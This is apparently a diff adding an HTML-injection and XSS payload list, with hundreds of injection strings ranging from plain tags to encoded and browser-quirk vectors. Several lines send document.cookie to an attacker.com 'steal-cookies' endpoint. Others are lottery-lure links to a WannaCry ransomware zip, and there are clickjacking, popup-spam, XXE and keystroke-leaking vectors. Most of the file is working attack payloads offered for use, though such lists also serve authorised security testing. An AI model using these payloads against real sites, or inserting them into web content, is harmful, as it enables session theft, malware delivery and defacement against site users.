@@ -1,0 +1,341 @@
+javascript:var a="ale";var b="rt";var c="()";decodeURI("<button popovertarget=x>Click me</button><akhil onbeforetoggle="+a+b+c+" popover id=x>Akhil</akhil>")
+<h1>HTML</h1>
+<h1>html</h1>
+<h2>HTML</h2>
+<h3>HTML</h3>
+<h4>HTML</h4>
+<h5>HTML</h5>
+<h6>HTML</h6>
+<pre>HTML</pre>
+<p>HTML</p>
+<h1><font color=red>Visit Our New Website to gain the lottery </h1><h3><mark><a href="https://github.com/chronosmiki/RANSOMWARE-WANNACRY-2.0/raw/master/Ransomware.WannaCry.zip">example.com </a></mark></h3>
+<i>HTML</i>
+<h1><font color=red>Visit Our New Website to gain the lottery </h1><h3><mark><a href="https://cyberjerry.000webhostapp.com/hacked">example.com </a></mark></h3>
+<a href="https://github.com/chronosmiki/RANSOMWARE-WANNACRY-2.0/raw/master/Ransomware.WannaCry.zip">HTML</a>
+<abbr title="HTML">HTML</abbr>
+<a href="https://google.com">HTML</a>
+<acronym title="Armour Infosec">AI</acronym>
+<script>alert('Stored HTML Injection')</script>
+<img src="javascript:alert('Stored HTML Injection')">
+<svg/onload=alert('Stored HTML Injection')>
+<iframe src="javascript:alert('Stored HTML Injection')">
+<body onload=alert('Stored HTML Injection')>
+<img src=x onerror=alert('Stored HTML Injection')>
+<marquee onstart=alert('Stored HTML Injection')>
+<input type="image" src="javascript:alert('Stored HTML Injection')">
+<img src=1 href=1 onerror=alert('Stored HTML Injection') />
+<input type="hidden" onkeypress="alert('Stored HTML Injection')">
+<audio onloadstart="alert('Stored HTML Injection')">
+<form onsubmit="alert('Stored HTML Injection')">
+<textarea onchange="alert('Stored HTML Injection')">
+<base href="javascript:alert('Stored HTML Injection')">
+<a href="javascript:alert('Stored HTML Injection')">Click me</a>
+<object data="javascript:alert('Stored HTML Injection')">
+<img src="x" onmouseover="alert('Stored HTML Injection')">
+<script>document.write('<iframe src="https://attacker.com/steal-cookies?cookie=' + document.cookie + '"></iframe>');</script>
+<body background="javascript:alert('Stored HTML Injection')">
+<embed src="javascript:alert('Stored HTML Injection')">
+<body><svg><script>alert('Stored HTML Injection')</script></svg></body>
+<a href="data:text/html,<script>alert('Stored HTML Injection')</script>">Click me</a>
+<svg/onload=alert('Reflected HTML Injection')>
+<body onload=alert('Reflected HTML Injection')>
+<img src=x onerror=alert('Reflected HTML Injection')>
+<marquee onstart=alert('Reflected HTML Injection')>
+<input type="image" src="javascript:alert('Reflected HTML Injection')">
+<img src=1 href=1 onerror=alert('Reflected HTML Injection') />
+<input type="hidden" onkeypress="alert('Reflected HTML Injection')">
+<audio onloadstart="alert('Reflected HTML Injection')">
+<form onsubmit="alert('Reflected HTML Injection')">
+<textarea onchange="alert('Reflected HTML Injection')">
+<base href="javascript:alert('Reflected HTML Injection')">
+<a href="javascript:alert('Reflected HTML Injection')">Click me</a>
+<object data="javascript:alert('Reflected HTML Injection')">
+<img src="x" onmouseover="alert('Reflected HTML Injection')">
+<script>document.write('<iframe src="https://attacker.com/steal-cookies?cookie=' + document.cookie + '"></iframe>');</script>
+<body background="javascript:alert('Reflected HTML Injection')">
+<embed src="javascript:alert('Reflected HTML Injection')">
+<img src="javascript:alert(String.fromCharCode(88,83,83))">
+<svg onload=alert(String.fromCharCode(88,83,83))>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+<a href="javascript:alert(String.fromCharCode(88,83,83))">Click me</a>
+<marquee onstart=alert(String.fromCharCode(88,83,83))>
+<input type="image" src="javascript:alert(String.fromCharCode(88,83,83))">
+<input type="text" value="><img src=x onerror=alert('XSS')">
+<a href="javascript:void(0)" onmouseover=alert(String.fromCharCode(88,83,83))>Click me</a>
+<audio src onloadstart="alert(String.fromCharCode(88,83,83))">
+<video><source onerror="javascript:alert(String.fromCharCode(88,83,83))">
+<iframe src="javascript:alert(String.fromCharCode(88,83,83))">
+<body onload=alert(String.fromCharCode(88,83,83))>
+<address>address,address</address>
+<article><h2>Armour Infosec</h2></article>
+<audio controls><source src="demo.ogg" type="audio/ogg"><source src="demo.mp3" type="audio/mpeg"></audio>
+<b>HTML</b>
+<h1>HTML</h1><!--
+qq<h1>HTML</h1>
+qq<h1>HTML</h1>qq
+$$\<u>HTML</u>{}$$
+%3Ch1%3EHTML%3C%2Fh1%3E
+&lt;h1&gt;HTML&lt;/h1&gt;
+&#60;h1&#62;HTML&#60;/h1&#62;
+<iframe src="https://www.google.com" title="test"></iframe>
+123<h1>HTML</h1>
+<h1>HTML</h1>123
+123<h1>HTML</h1>123
+%253Ch1%253EHTML%253C%252Fh1%253E
+<iframe id="if1" src="https://www.google.com"></iframe>
+<iframe id="if2" src="https://www.google.com"></iframe>
+PGgxPkhUTUw8L2gxPg==
+UEdneFBraFVUVXc4TDJneFBnPT0=
+<<h1>HTML</h1>
+<<h1>HTML</h1>>
+<<h1>html</h1>>
+%253Ch1%253EHTML%253C%252Fh1%253E<h1>Html</h1>
+<pre>HTML</pre>
+<p>HTMLinjection here</p>
+<i>HTML</i>
+<u>Html</u>
+<mark>Html</mark>
+<a href="https://www.google.com">HTML</a>
+<b>HTML</b>
+<h1>HTML</h1><!--
+qq<h1>HTML</h1>
+qq<h1>HTML</h1>qq
+%3Ch1%3EHTML%3C%2Fh1%3E
+%253Ch1%253EHTML%253C%252Fh1%253E
+&lt;h1&gt;HTML&lt;/h1&gt;
+&amp;lt;h1&amp;gt;HTML&amp;lt;/h1&amp;gt;
+&#60;h1&#62;HTML&#60;/h1&#62;
+<iframe src="https://www.google.com" title="test"></iframe>
+123<h1>HTML</h1>
+<h1>HTML</h1>123
+123<h1>HTML</h1>123
+%253Ch1%253EHTML%253C%252Fh1%253E
+<iframe id="if1" src="https://www.google.com"></iframe>
+<iframe id="if2" src="https://www.google.com"></iframe>
+<<h1>HTML</h1>
+<<h1>HTML</h1>>
+<<h1>html</h1>>
+%253Ch1%253EHTML%253C%252Fh1%253E
+<div>HTML</div>
+%3Ci%3Ehtml%3C%2Fi%3E
+%253Ci%253Ehtml%253C%252Fi%253E
+<style>h1 {color:red;}</style><h1>This is a heading</h1>
+<textarea id="HTML" name="HTML" rows="4" cols="50">Html injected</textarea>
+<head><base href="https://www.google.com" target="_blank"></head>
+<span style="color:blue;font-weight:bold">html</span>
+<abbr title="HTML">HTML</abbr>
+<acronym title="Armour Infosec">AI</acronym>
+<address>address,address</address>
+<article><h2>Armour Infosec</h2></article>
+<audio controls><source src="demo.ogg" type="audio/ogg"><source src="demo.mp3" type="audio/mpeg"></audio>
+<bdi>Html</bdi>injection
+<bdo dir="rtl">HTML html</bdo>
+<blockquote cite="http://google.com">HTML Injection</blockquote>
+<body><h1>HTML html</h1></body>
+Html<br>line breaks<br>injection
+<button type="button">Click Me!</button> 
+<canvas id="myCanvas">draw htmli</canvas>
+<caption>Html</caption>
+<cite>Html Html</cite> 
+<code>Html</code>
+<colgroup><col span="2" style="background-color:red"></colgroup>
+<data value="21053">test html</data>
+<datalist id="html"><option value="html"></datalist>
+<dl><dt>Html</dt></dl>
+<dt>Html</dt>
+<dd>Html</dd>
+<del>Html</del>
+<ins>Html</ins>
+<details><summary>HTML</summary><p>html html</p></details>
+<dfn>HTML</dfn>
+<dialog open>Html</dialog> 
+<dialog close></dialog>
+<em>Html</em>
+<embed type="text/html" src="index.html" width="500" height="200"> 
+<fieldset><legend>hello:</legend><label for="fname">First name:</label><input type="text"id="fname"name="fname"><br><br><inputtype="submit" value="Submit"></fieldset>
+<figure>Html</figure>
+<figcaption>Html Html</figcaption>
+<footer>HTML html</footer>
+<form method="GET">Username: <input type="text" name="username" value="" /> <br />Password: <input type="password" name="passwd" value="" /> <br /><input type="submit" name="submit" value="login" /></form>
+<form method="POST">Username: <input type="text" name="username" value="" /> <br />Password: <input type="password" name="passwd" value="" /> <br /><input type="submit" name="submit" value="login" /></form>
+<head><title>html</title></head>
+<header>HTML html</header>
+<hr>html<hr>
+<img src="index.jpg" alt="Girl in a jacket" width="500" height="600">
+<input type="text" id="name" name="name">
+<ins>red</ins>
+<kbd>Ctrl</kbd>
+label for="html">HTML</label><br>
+<legend>Html</legend>
+<li>Html</li>
+<main>Html</main>
+<map name="workmap">Html</map>
+<meter id="html" value="2" min="0" max="10">2 out of 10</meter>
+<nav>Html</nav>
+<noscript>Sorry, your browser does not support Html</noscript>
+<ol>Html</ol>
+<optgroup label="Html"></optgroup>
+<option value="Html>Html</option>
+<pre>Html</pre>
+<progress id="html" value="32" max="100"> 32% </progress>
+<q>Html Html</q>
+<s>Only 50 tickets left</s>
+<samp>File not found</samp>
+<section>HTML</section>
+<select name="cars" id="cars"></select>
+<small>HTML rocks</small>
+<strong>Html</strong>
+<sub>Html</sub>
+<summary>Html</summary>
+<sup>Html</sup>
+<svg width="100" height="100"><circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" /></svg>
+<table><th>HTML</th><th>HTML</th></table>
+<time>10:10</time>
+<time datetime="2008-02-14 20:00">HTML</time>
+<ul>html</ul>
+<var>Html</var>
+<video width="320" height="240" controls></video>
+<wbr>HTML html<wbr>
+<div>HTML</div>
+%3Ci%3Ehtml%3C%2Fi%3E
+%253Ci%253Ehtml%253C%252Fi%253E
+<a href="https://evil.com">click me</a><img src="https://www.freeiconspng.com/thumbs/click-png/hands-click-png-icon-5.png">
+## From Paweł Krawczyk (https://github.com/kravietz/text-jso) and http://heideri.ch/jso/
+<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
+<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
+<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
+0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))
+<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
+<script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>
+<input onfocus=write(1) autofocus>
+<input onblur=write(1) autofocus><input autofocus>
+<a style="-o-link:'javascript:alert(1)';-o-link-source:current">X</a>
+<video poster=javascript:alert(1)//></video>
+<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg>
+<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>
+<input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>
+<script>({0:#0=alert/#0#/#0#(0)})</script>
+X<x style=`behavior:url(#default#time2)` onbegin=`write(1)` >
+<?xml-stylesheet href="javascript:alert(1)"?><root/>
+<script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>
+<meta charset="x-mac-farsi">Â¼script Â¾alert(1)//Â¼/script Â¾
+<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1)}),x</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
+<input onblur=focus() autofocus><input>
+<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>X</button>
+1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(1)&gt;`>
+<script src="#">{alert(1)}</script>;1
++ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);
+<style>p[foo=bar{}*{-o-link:'javascript:alert(1)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>
+1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(1)&gt;>
+<link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d
+<style>@import "data:,*%7bx:expression(write(1))%7D";</style>
+<frameset onload=alert(1)>
+<table background="javascript:alert(1)"></table>
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(2)">XXX</a>
+1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>
+1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XXX</a>
+<!--<img src="--><img src=x onerror=alert(1)//">
+<comment><img src="</comment><img src=x onerror=alert(1)//">
+<!-- up to Opera 11.52, FF 3.6.28 --><![><img src="]><img src=x onerror=alert(1)//"><!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  --><svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg>
+<style><img src="</style><img src=x onerror=alert(1)//">
+<li style=list-style:url() onerror=alert(1)></li><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)></div>
+<head><base href="javascript://"/></head><body><a href="/. /,alert(1)//#">XXX</a></body>
+<?xml version="1.0" standalone="no"?><html xmlns="http://www.w3.org/1999/xhtml"><head><style type="text/css">@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}</style></head><body>Hello</body></html>
+<style>*[{}@import'test.css?]{color: green;}</style>X
+<div style="font-family:'foo[a];color:red;';">XXX</div>
+<div style="font-family:foo}color=red;">XXX</div>
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
+<SCRIPT FOR=document EVENT=onreadystatechange>alert(1)</SCRIPT>
+<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>
+<x style="behavior:url(test.sct)">
+<xml id="xss" src="test.htc"></xml><label dataformatas="html" datasrc="#xss" datafld="payload"></label>
+<script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>
+<video><source onerror="alert(1)">
+<video onerror="alert(1)"><source></source></video>
+<b <script>alert(1)//</script>0</script></b>
+<b><script<b></b><alert(1)</script </b></b>
+<div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
+<div style="[a]color[b]:[c]red">XXX</div>
+<div  style="\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;">XXX</div>
+<!-- IE 6-8 --><x '="foo"><x foo='><img src=x onerror=alert(1)//'><!-- IE 6-9 --><! '="foo"><x foo='><img src=x onerror=alert(2)//'><? '="foo"><x foo='><img src=x onerror=alert(3)//'>
+<embed src="javascript:alert(1)"></embed> // O10.10â, OM10.0â, GC6â, FF<img src="javascript:alert(2)"><image src="javascript:alert(2)"> // IE6, O10.10â, OM10.0â<script src="javascript:alert(3)"></script> // IE6, O11.01â, OM10.1â
+<!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y>
+<svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>
+<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?><root/>
+<!DOCTYPE x [	<!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx:x" onerror CDATA "alert(1)" onload CDATA "alert(2)">]><img />
+<doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">	<html:style /><x xlink:href="javascript:alert(1)" xlink:type="simple">XXX</x></doc>
+<card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(1)"/></onevent><timer value="1"/></card>
+<div style=width:1px;filter:glow onfilterchange=alert(1)>x</div>
+<// style=x:expression\28write(1)\29>
+<form><button formaction="javascript:alert(1)">X</button>
+<event-source src="event.php" onload="alert(1)">
+<a href="javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>
+<script<{alert(1)}/></script </>
+<?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>
+<?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>
+<?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>
+<object allowscriptaccess="always" data="test.swf"></object>
+<style>*{x:ï½ï½ï½ï½ï½ï½ï½ï½ï½ï½(write(1))}</style>
+<x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(1)" xlink:type="simple"/>
+<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>
+<x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)"><x:timer value="1"/></x:template>
+<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(1)//#x"/>
+<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>
+<body oninput=alert(1)><input autofocus>
+<svg xmlns="http://www.w3.org/2000/svg"><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="1000" height="1000" fill="white"/></a></svg>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><animation xlink:href="javascript:alert(1)"/><animation xlink:href="data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E%3C/svg%3E"/><image xlink:href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E%3C/svg%3E"/><foreignObject xlink:href="javascript:alert(1)"/><foreignObject xlink:href="data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3Ealert(1)%3C/script%3E"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><set attributeName="onmouseover" to="alert(1)"/><animate attributeName="onunload" to="alert(1)"/></svg>
+<!-- Up to Opera 10.63 --><div style=content:url(test2.svg)></div><!-- Up to Opera 11.64 - see link below --><!-- Up to Opera 12.x --><div style="background:url(test5.svg)">PRESS ENTER</div>
+[A]<? foo="><script>alert(1)</script>"><! foo="><script>alert(1)</script>"></ foo="><script>alert(1)</script>">[B]<? foo="><x foo='?><script>alert(1)</script>'>">[C]<! foo="[[[x]]"><x foo="]foo><script>alert(1)</script>">[D]<% foo><x foo="%><script>alert(1)</script>">
+<div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>
+<div style="list-style:url(http://foo.f)\20url(javascript:alert(1));">X</div>
+<svg xmlns="http://www.w3.org/2000/svg"><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler></svg>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><feImage><set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/></feImage></svg>
+<iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe><iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>
+<!-- IE 5-9 --><div id=d><x xmlns="><iframe onload=alert(1)"></div><script>d.innerHTML+='';</script><!-- IE 10 in IE5-9 Standards mode --><div id=d><x xmlns='"><iframe onload=alert(2)//'></div><script>d.innerHTML+='';</script>
+<div id=d><div style="font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'">X</div></div><script>with(document.getElementById("d"))innerHTML=innerHTML</script>
+XXX<style>*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */<!----><!--*{color:red}   /* all UA */*{background:url(xx:x //**/\red/*)} /* IE 6-7 Standards mode */</style>
+<img[a][b]src=x[d]onerror[c]=[e]"alert(1)">
+<a href="[a]java[b]script[c]:alert(1)">XXX</a>
+<img src="x` `<script>alert(1)</script>"` `>
+<script>history.pushState(0,0,'/i/am/somewhere_else');</script>
+<svg xmlns="http://www.w3.org/2000/svg" id="foo"><x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(1) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/></svg>
+<iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>
+<img src onerror /" '"= alt=alert(1)//">
+<title onpropertychange=alert(1)></title><title title=></title>
+<!-- IE 5-8 standards mode --><a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx:x onerror=alert(1)></a>"><!-- IE 5-9 standards mode --><!a foo=x=`y><img alt="`><img src=xx:x onerror=alert(2)//"><?a foo=x=`y><img alt="`><img src=xx:x onerror=alert(3)//">
+<svg xmlns="http://www.w3.org/2000/svg"><a id="x"><rect fill="white" width="1000" height="1000"/></a><rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><path d="M0,0" style="marker-start:url(test4.svg#a)"/></svg>
+<div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>
+<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>
+<div id="x">XXX</div><style>#x{font-family:foo[bar;color:green;}#y];color:red;{}</style>
+<x style="background:url('x[a];color:red;/*')">XXX</x>
+<!--[if]><script>alert(1)</script --><!--[if<img src=x onerror=alert(2)//]> -->
+<div id="x">x</div><xml:namespace prefix="t"><import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=alert(1)&gt;">
+<a href="http://attacker.org">	<iframe src="http://example.org/"></iframe></a>
+<div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious code');">	<h1>Drop me</h1></div><iframe src="http://www.example.org/dropHere.html"></iframe>
+<iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe><textarea type="text" cols="50" rows="10"></textarea>
+<script>function makePopups(){	for (i=1;i<6;i++) {		window.open('popup.html','spam'+i,'width=50,height=50');	}}</script><body><a href="#" onclick="makePopups()">Spam</a>
+<html xmlns="http://www.w3.org/1999/xhtml"xmlns:svg="http://www.w3.org/2000/svg"><body style="background:gray"><iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);"/><svg:svg><svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox">	<svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/>	<svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/></svg:mask></svg:svg></body></html>
+<iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>
+<span class=foo>Some text</span><a class=bar href="http://www.example.org">www.example.org</a><script src="http://code.jquery.com/jquery-1.4.4.js"></script><script>$("span.foo").click(function() {alert('foo');$("a.bar").click();});$("a.bar").click(function() {alert('bar');location="http://html5sec.org";});</script>
+<script src="/\example.com\foo.js"></script> // Safari 5.0, Chrome 9, 10<script src="\\example.com\foo.js"></script> // Safari 5.0
+<?xml version="1.0"?><?xml-stylesheet type="text/xml" href="#stylesheet"?><!DOCTYPE doc [<!ATTLIST xsl:stylesheet  id    ID    #REQUIRED>]><svg xmlns="http://www.w3.org/2000/svg">    <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">        <xsl:template match="/">            <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(1)"></iframe>        </xsl:template>    </xsl:stylesheet>    <circle fill="red" r="40"></circle></svg>
+<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object><object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
+<svg xmlns="http://www.w3.org/2000/svg" id="x"><listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/><handler id="y">alert(1)</handler></svg>
+<svg><style>&lt;img/src=x onerror=alert(1)// </b>
+<svg><image style='filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(1)</script></svg>")'><!--Same effect with<image filter='...'>--></svg>
+<math href="javascript:alert(1)">CLICKME</math><math><!-- up to FF 13 --><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">CLICKME</maction><!-- FF 14+ --><maction actiontype="statusline" xlink:href="javascript:alert(3)">CLICKME<mtext>http://http://google.com</mtext></maction></math>
+<b>drag and drop one of the following strings to the drop box:</b><br/><hr/>jAvascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>feed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie)&#x3c;/script>&#x3c;b><br/><hr/>feed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/><div id="dropbox" style="height: 360px;width: 500px;border: 5px solid #000;position: relative;" ondragover="event.preventDefault()">+ Drop Box +</div>
+<!doctype html><form><label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label><br><input name="secret" type="password"></form><!-- injection --><svg height="50px"><image xmlns:xlink="http://www.w3.org/1999/xlink"><set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" /><set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" /><set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" /><set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" /></image></svg>
+<!-- `<img/src=xx:xx onerror=alert(1)//--!>
+<xmp><%</xmp><img alt='%></xmp><img src=xx:x onerror=alert(1)//'><script>x='<%'</script> %>/alert(2)</script>XXX<style>*['<!--']{}</style>-->{}*{color:red}</style>
+<?xml-stylesheet type="text/xsl" href="#" ?><stylesheet xmlns="http://www.w3.org/TR/WD-xsl"><template match="/"><eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(1)</eval><if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if></template></stylesheet>
+<form action="" method="post"><input name="username" value="admin" /><input name="password" type="password" value="secret" /><input name="injected" value="injected" dirname="password" /><input type="submit"></form>
